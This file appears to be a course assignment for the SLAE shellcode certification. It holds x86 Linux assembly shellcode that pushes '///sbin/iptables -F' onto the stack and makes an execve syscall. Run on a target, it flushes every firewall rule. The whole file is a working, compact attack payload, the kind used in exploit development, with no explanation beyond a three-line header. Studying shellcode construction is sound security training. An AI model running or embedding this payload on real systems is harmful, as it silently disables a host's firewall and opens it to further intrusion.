# Dissection - iptables -F, optimized original version
# Paw Petersen, SLAE-656
# https://www.pawpetersen.dk/slae-assignment-6a-polymorphic-shellcode-flush-iptables-linux-x86/

global _start
section .text
_start:
  xor     eax,eax
  cdq
  push    edx
  push    word 0x462d
  mov     esi,esp
  push    edx
  push    0x73656c62
  push    0x61747069
  mov     edi,esp
  push    0x2f6e6962
  push    0x732f2f2f
  mov     ebx,esp
  push    edx
  push    esi
  push    edi
  mov     ecx,esp
  mov     byte al,0xb
  int     0x80
